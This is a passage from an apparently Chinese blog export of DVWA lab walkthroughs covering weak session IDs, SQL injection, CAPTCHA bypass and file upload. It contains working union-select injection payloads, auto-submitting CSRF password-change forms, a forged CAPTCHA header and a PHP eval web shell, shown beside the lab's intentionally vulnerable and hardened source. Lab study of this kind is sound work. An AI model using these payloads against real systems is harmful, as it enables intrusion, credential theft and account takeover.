&quot;&quot; [, string $domain = &quot;&quot; [, bool $secure = false [, bool $httponly = false ]]]]]] ) : bool name：Cookie 名称 value：Cookie 值。 这个值储存于用户的电脑里，请勿储存敏感信息。 比如 name 是 &#39;cookiename&#39;， 可通过 $_COOKIE[&#39;cookiename&#39;] 获取它的值 expire：Cookie 的过期时间。 这是个 Unix 时间戳，即 Unix 纪元以来（格林威治时间 1970 年 1 月 1 日 00:00:00）的秒数。 也就是说，基本可以用 time() 函数的结果加上希望过期的秒数。 或者也可以用 mktime()。 time()+60*60*24*30 就是设置 Cookie 30 天后过期。 如果设置成零，或者忽略参数， Cookie 会在会话结束时过期（也就是关掉浏览器时） Note:你可能注意到了，expire 使用 Unix 时间戳而非 Wdy, DD-Mon-YYYY HH:MM:SS GMT 这样的日期格式，是因为 PHP 内部作了转换 path：Cookie 有效的服务器路径。 设置成 &#39;/&#39; 时，Cookie 对整个域名 domain 有效。 如果设置成 &#39;/foo/&#39;， Cookie 仅仅对 domain 中 /foo/ 目录及其子目录有效（比如 /foo/bar/）。 默认值是设置 Cookie 时的当前目录 domain：Cookie 的有效域名/子域名。 设置成子域名（例如 &#39;www.example.com&#39;），会使 Cookie 对这个子域名和它的三级域名有效（例如 w2.www.example.com）。 要让 Cookie 对整个域名有效（包括它的全部子域名），只要设置成域名就可以了（这个例子里是 &#39;example.com&#39;） 旧版浏览器仍然在使用废弃的 » RFC 2109， 需要一个前置的点 . 来匹配所有子域名。 secure：设置这个 Cookie 是否仅仅通过安全的 HTTPS 连接传给客户端。 设置成 TRUE 时，只有安全连接存在时才会设置 Cookie。 如果是在服务器端处理这个需求，程序员需要仅仅在安全连接上发送此类 Cookie （通过 $_SERVER[&quot;HTTPS&quot;] 判断） httponly：设置成 TRUE，Cookie 仅可通过 HTTP 协议访问。 这意思就是 Cookie 无法通过类似 JavaScript 这样的脚本语言访问。 要有效减少 XSS 攻击时的身份窃取行为，可建议用此设置（虽然不是所有浏览器都支持），不过这个说法经常有争议。 PHP 5.2.0 中添加。 TRUE 或 FALSE 直接将刚才抓到的请求中的security字段改为high然后点击go，就可以看到服务器设置的新的dvwaSession 这个dvwaSession每次请求，经过过加1，md5加密。但是如果这被我们发现了规律（从0开始每次加1），当我们知道下一个dvwaSession的值后，经过md5加密再去提交 然后还是像之前一样直接发起请求，URL：192.168.0.108/dvwa/vulnerabilities/weak_id/；Cookie：dvwaSession=eccbc87e4b5ce2fe28308fd9f2a7baf3; security=high; PHPSESSID=vvto3lge8mrfug568nmngbpbt1。登录成功 Security Level — Impossible核心代码 &lt;?php $html = &quot;&quot;; if ($_SERVER[&#39;REQUEST_METHOD&#39;] == &quot;POST&quot;) { $cookie_value = sha1(mt_rand() . time() . &quot;Impossible&quot;); setcookie(&quot;dvwaSession&quot;, $cookie_value, time()+3600, &quot;/vulnerabilities/weak_id/&quot;, $_SERVER[&#39;HTTP_HOST&#39;], true, true); } ?&gt; 在本难度中，dvwaSession的值采用随机数+时间戳+&quot;Impossible&quot;，这就无法猜测出到底是多少了。并且开启了setcookie函数中的secure和httponly选项。实现了用户安全会话认证 参考文章： http://www.storysec.com/dvwa-weak-session-ids.html","categories":[],"tags":[{"name":"DVWA","slug":"DVWA","permalink":"https://knlvre.github.io/tags/DVWA/"}],"author":"Knlvre"},{"title":"DVWA 7-SQL Injection（SQL注入）","slug":"DVWA 7-SQL Injection（SQL注入）","date":"2019-02-15T16:00:00.000Z","updated":"2019-08-12T10:55:15.372Z","comments":true,"path":"2019/02/16/DVWA 7-SQL Injection（SQL注入）/","link":"","permalink":"https://knlvre.github.io/2019/02/16/DVWA 7-SQL Injection（SQL注入）/","excerpt":"","text":"源码位置DVWA\\vulnerabilities\\sqli\\source\\ 页面功能输入一个ID，返回该ID的信息 Security Level — Low核心代码 &lt;?php if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) { // Get input $id = $_REQUEST[ &#39;id&#39; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) { // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user $html .= &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); } ?&gt; 源码中看出来对参数没有任何的处理，那我们就当黑盒测试一步步做（sqli-labs刷完了写的挺详细，所以这里简单写，不再赘述） ①报错信息得知单引号包裹 1&#39; 返回：your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;&#39; at line 1 ②order by注出列数为2 1&#39; order by 3# 返回：Unknown column &#39;3&#39; in &#39;order clause&#39; ③union select返回成功 -1&#39; union select 1,2# 返回：First name: 1；Surname: 2 ④注数据库名 -1&#39; union select 1,database()# 返回：First name: 1；Surname: dvwa ⑤注表名 -1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;dvwa&quot;# 返回：First name: 1；Surname: guestbook,users ⑥注列名 -1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;# 返回：First name: 1；Surname: user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password ⑦注数据 -1&#39; union select 1,group_concat(user,password) from users where user_id=1# 返回：First name: 1；Surname:adminfae0b27c451c728867a567e8c1bb4e53 Security Level — Medium核心代码 &lt;?php if( isset( $_POST[ &#39;Submit&#39; ] ) ) { // Get input $id = $_POST[ &#39;id&#39; ]; $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id); $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &#39;&lt;pre&gt;&#39; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &#39;&lt;/pre&gt;&#39; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) { // Display values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user $html .= &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } } // This is used later on in the index.php page // Setting it here so we can close the database connection in here like in the rest of the source scripts $query = &quot;SELECT COUNT(*) FROM users;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); $number_of_rows = mysqli_fetch_row( $result )[0]; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); ?&gt; 本难度中，使用了mysqli_real_escape_string()函数对传入的参数进行了处理，受影响的特殊字符有：\\x00,\\n,\\r,\\,’,”,\\x1a。并且页面中，对参数的输入变成了下拉菜单，希望以此来控制用户的输入 但是我们可以通过抓包，来改变传入的参数 整形注入，其他与前一难度一样了，不再赘述 Security Level — High核心代码 &lt;?php if( isset( $_SESSION [ &#39;id&#39; ] ) ) { // Get input $id = $_SESSION[ &#39;id&#39; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#39; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) { // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user $html .= &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 本难度提交方式又改变了，需要先点击Click here to change your ID.，然后才在弹出的边框中输入参数，源代码中对参数的获取也变成从$_SESSION[]这个全局数组获取 与上一关一样，试着抓包修改参数，然后将返回的页面显示在浏览器上，发现返回的只是这个弹出的窗口，并没有有用信息，所以这样做还是有一定的防御作用的。但是这题没必要抓包，直接使用他提供的窗口进行注入就可以 单引号包裹，其他与前面的一样，不再赘述 Security Level — Impossible核心代码 &lt;?php if( isset( $_GET[ &#39;Submit&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Get input $id = $_GET[ &#39;id&#39; ]; // Was a number entered? if(is_numeric( $id )) { // Check the database $data = $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Make sure only 1 result is returned if( $data-&gt;rowCount() == 1 ) { // Get values $first = $row[ &#39;first_name&#39; ]; $last = $row[ &#39;last_name&#39; ]; // Feedback for end user $html .= &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 看了源码之后，发现这里的代码对查询语句的构造和之前的难度不一样了，这里用了PDO的prepare()、bindParam()、execute()三个函数来完成查询语句的构造和执行，关于讲解可以参考这篇文章：https://www.cnblogs.com/zhouguowei/p/5212994.html PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性 参考文章： https://www.freebuf.com/articles/web/120747.html","categories":[],"tags":[{"name":"DVWA","slug":"DVWA","permalink":"https://knlvre.github.io/tags/DVWA/"}],"author":"Knlvre"},{"title":"DVWA 6-Insecure CAPTCHA（不安全的验证码）","slug":"DVWA 6-Insecure CAPTCHA（不安全的验证码）","date":"2019-02-14T16:00:00.000Z","updated":"2019-08-05T08:44:45.451Z","comments":true,"path":"2019/02/15/DVWA 6-Insecure CAPTCHA（不安全的验证码）/","link":"","permalink":"https://knlvre.github.io/2019/02/15/DVWA 6-Insecure CAPTCHA（不安全的验证码）/","excerpt":"","text":"源码位置DVWA\\vulnerabilities\\captcha\\source\\ 页面功能和CSRF一样的功能：更改密码，但是却要通过验证码（但是由于验证码是由谷歌提供，没有翻墙也就没有验证码） 解决 reCAPTCHA API key missing 问题参考文章：https://blog.csdn.net/RBPicsdn/article/details/80059132 Security Level — Low核心代码 &lt;?php if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;1&#39; ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ &#39;recaptcha_private_key&#39;], $_POST[&#39;g-recaptcha-response&#39;] ); // Did the CAPTCHA fail? if( !$resp ) { // What happens when the CAPTCHA was entered incorrectly $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } else { // CAPTCHA was correct. Do both new passwords match? if( $pass_new == $pass_conf ) { // Show next stage for the user $html .= &quot; &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\\&quot;#\\&quot; method=\\&quot;POST\\&quot;&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;step\\&quot; value=\\&quot;2\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_new\\&quot; value=\\&quot;{$pass_new}\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_conf\\&quot; value=\\&quot;{$pass_conf}\\&quot; /&gt; &lt;input type=\\&quot;submit\\&quot; name=\\&quot;Change\\&quot; value=\\&quot;Change\\&quot; /&gt; &lt;/form&gt;&quot;; } else { // Both new passwords do not match. $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } } if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;2&#39; ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // Check to see if both password match if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); // Feedback for the end user $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with the passwords matching $html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; $hide_form = false; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 源代码只是简单地通过setp参数来决定执行哪些步骤：①setp=1时接受用户提交的新密码、新密码确认、验证码，然后对验证码进行验证，验证通过后，如果新密码等于新密码确认，重新构造并提交表单（包含新密码、新密码确认和setp=2）；②setp=2时，直接将密码进行md5加密后修改当前登录用户的密码。很容易看出来这个逻辑漏洞，这个setp参数是通过POST方式提交的并且可控的话，我们可以直接绕过验证码的验证部分，进入修改密码部分 现在修改密码并抓包看一下请求包的内容 Ps:因为没有翻墙，所以没能成功显示验证码，发送的请求包中也就没有recaptcha_challenge_field、recaptcha_response_field两个参数 将setp=1改为setp=2，然后发送请求后，可以看到提示Password Changed 由于没有防CSRF的机制，所以现在构造攻击页面去攻击，HTML代码如下 &lt;html&gt; &lt;body onload=&quot;document.getElementById(&#39;transfer&#39;).submit()&quot;&gt; &lt;div&gt; &lt;form method=&quot;POST&quot; id=&quot;transfer&quot; action=&quot;http://192.168.0.105/dvwa/vulnerabilities/captcha/&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;888&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;888&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;step&quot; value=&quot;2&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 当受害者访问这个页面之后，代码就会自动向服务器提交表单利用刚才分析的漏洞去修改密码。但是有一点不好就是服务器会302重定向，返回修改密码成功的页面，受害者就会马上意识到 Security Level — Medium核心代码 &lt;?php if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;1&#39; ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ &#39;recaptcha_private_key&#39; ], $_POST[&#39;g-recaptcha-response&#39;] ); // Did the CAPTCHA fail? if( !$resp ) { // What happens when the CAPTCHA was entered incorrectly $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } else { // CAPTCHA was correct. Do both new passwords match? if( $pass_new == $pass_conf ) { // Show next stage for the user $html .= &quot; &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\\&quot;#\\&quot; method=\\&quot;POST\\&quot;&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;step\\&quot; value=\\&quot;2\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_new\\&quot; value=\\&quot;{$pass_new}\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_conf\\&quot; value=\\&quot;{$pass_conf}\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;passed_captcha\\&quot; value=\\&quot;true\\&quot; /&gt; &lt;input type=\\&quot;submit\\&quot; name=\\&quot;Change\\&quot; value=\\&quot;Change\\&quot; /&gt; &lt;/form&gt;&quot;; } else { // Both new passwords do not match. $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } } if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;2&#39; ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // Check to see if they did stage 1 if( !$_POST[ &#39;passed_captcha&#39; ] ) { $html .= &quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;; $hide_form = false; return; } // Check to see if both password match if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); // Feedback for the end user $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with the passwords matching $html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; $hide_form = false; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 本难度只是在setp=1提交的表单中多添加了passed_captcha参数，当setp=2没有检测到这个参数时就会报错。那解决办法也很简单，只需要在我们做的攻击表单中多添加这个参数，值为true就可以了 &lt;html&gt; &lt;body onload=&quot;document.getElementById(&#39;transfer&#39;).submit()&quot;&gt; &lt;div&gt; &lt;form method=&quot;POST&quot; id=&quot;transfer&quot; action=&quot;http://192.168.0.105/dvwa/vulnerabilities/captcha/&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;777&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;777&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;passed_captcha&quot; value=&quot;true&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;step&quot; value=&quot;2&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 修改完代码，重新访问，密码再次成功更改 Security Level — High核心代码 &lt;?php if( isset( $_POST[ &#39;Change&#39; ] ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ &#39;recaptcha_private_key&#39; ], $_POST[&#39;g-recaptcha-response&#39;] ); if ( $resp || ( $_POST[ &#39;g-recaptcha-response&#39; ] == &#39;hidd3n_valu3&#39; &amp;&amp; $_SERVER[ &#39;HTTP_USER_AGENT&#39; ] == &#39;reCAPTCHA&#39; ) ){ // CAPTCHA was correct. Do both new passwords match? if ($pass_new == $pass_conf) { $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); // Feedback for user $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Ops. Password mismatch $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } else { // What happens when the CAPTCHA was entered incorrectly $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 本难度取消了step参数的判断，而多了以下的判断 $resp || ($_POST[ &#39;g-recaptcha-response&#39; ] == &#39;hidd3n_valu3&#39;&amp;&amp; $_SERVER[ &#39;HTTP_USER_AGENT&#39; ] == &#39;reCAPTCHA&#39;) 只有符合以上条件才能进入修改密码的代码，$resp我们已经确定无法控制，所以现在就从$_POST[ &#39;g-recaptcha-response&#39; ]和$_SERVER[ &#39;HTTP_USER_AGENT&#39; ]入手了。修改一下这两个参数也很简单，抓包修改就可以，如下图 重新登录验证一下，密码果然修改成功 Security Level — Impossible核心代码 &lt;?php if( isset( $_POST[ &#39;Change&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new = $_POST[ &#39;password_new&#39; ]; $pass_new = stripslashes( $pass_new ); $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); $pass_conf = $_POST[ &#39;password_conf&#39; ]; $pass_conf = stripslashes( $pass_conf ); $pass_conf = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_conf ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_conf = md5( $pass_conf ); $pass_curr = $_POST[ &#39;password_current&#39; ]; $pass_curr = stripslashes( $pass_curr ); $pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_curr = md5( $pass_curr ); // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ &#39;recaptcha_private_key&#39; ], $_POST[&#39;g-recaptcha-response&#39;] ); // Did the CAPTCHA fail? if( !$resp ) { // What happens when the CAPTCHA was entered incorrectly $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } else { // Check that the current password is correct $data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR ); $data-&gt;execute(); // Do both new password match and was the current password correct? if( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) { // Update the database $data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; ); $data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR ); $data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;execute(); // Feedback for the end user - success! $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Feedback for the end user - failed! $html .= &quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;; $hide_form = false; } } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; Impossible难度加入了Anti-CSRF token验证，并且防止了sql注入，还要输入原密码才能更改，将更改密码的验证过程巩固地很安全 参考文章： https://www.freebuf.com/articles/web/119692.html","categories":[],"tags":[{"name":"DVWA","slug":"DVWA","permalink":"https://knlvre.github.io/tags/DVWA/"}],"author":"Knlvre"},{"title":"DVWA 5-File Upload（文件上传）","slug":"DVWA 5-File Upload（文件上传）","date":"2019-02-13T16:00:00.000Z","updated":"2019-09-11T00:51:11.401Z","comments":true,"path":"2019/02/14/DVWA 5-File Upload（文件上传）/","link":"","permalink":"https://knlvre.github.io/2019/02/14/DVWA 5-File Upload（文件上传）/","excerpt":"","text":"源码位置DVWA\\vulnerabilities\\upload\\source\\ 页面功能上传本地文件到服务器 Security Level — Low核心代码 &lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) { // No $html .= &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; } else { // Yes! $html .= &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } ?&gt; basename()函数：返回路径中的文件名部分 basename ( string $path [, string $suffix ] ) : string path：一个路径。 在 Windows 中，斜线（/）和反斜线（\\）都可以用作目录分隔符。在其它环境下是斜线（/）。 suffix：如果文件名是以 suffix 结束的，那这一部分也会被去掉。 从源码中可以看出，文件上传的位置为根目录/hackable/uploads，上传成功后会返回上传的路径，对上传的文件没有任何的限制。现在我们写一个一句话木马（muma.php），并将它上传 &lt;?php @eval($_POST[&#39;muma&#39;]); ?&gt; 可以上传成功，并且返回信息../../hackable/uploads/muma.php succesfully uploaded! 现在我们就可以用菜刀去连接这个文件，可以连接成功 地址：http://192.168.0.105/dvwa/hackable/uploads/muma.php 参数：muma 并且可以使用服务器的虚拟终端 Security Level — Medium核心代码 &lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); // File information $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ]; $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; // Is it an image? if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( 